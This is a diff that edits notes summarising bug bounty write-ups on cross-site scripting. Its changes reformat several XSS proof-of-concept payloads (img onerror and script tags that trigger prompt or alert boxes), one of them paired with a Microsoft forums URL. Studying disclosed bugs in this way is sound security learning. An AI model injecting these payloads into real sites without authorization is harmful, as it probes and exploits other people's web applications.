@@ -35,7 +35,8 @@ Key Learn from this writeup ->
 	* There in above fields he putted payloads
 
 Target link : https://social.microsoft.com/Forums/en-US/home
-Payload : “`><img src=x onerror=prompt(document.domain)>`
+Payload : 
+		`“><img src=x onerror=prompt(document.domain)>`
 
 ---------------------------------------------------------------------------------
 ---------------------------------------------------------------------------------
@@ -92,7 +93,7 @@ He got this result ->
 
 ![](https://miro.medium.com/max/1366/1*V4xY_c6wTcumgt2C8rMvfQ.png)
 
---	Then he used payload -> <script>alert(1)</script> but didn’t work but this payload worked ->
+--	Then he used payload -> `<script>alert(1)</script>` but didn’t work but this payload worked ->
 		`<img src=x onerror=alert(‘XSS’)>`
 
 ##### Second XSS ->
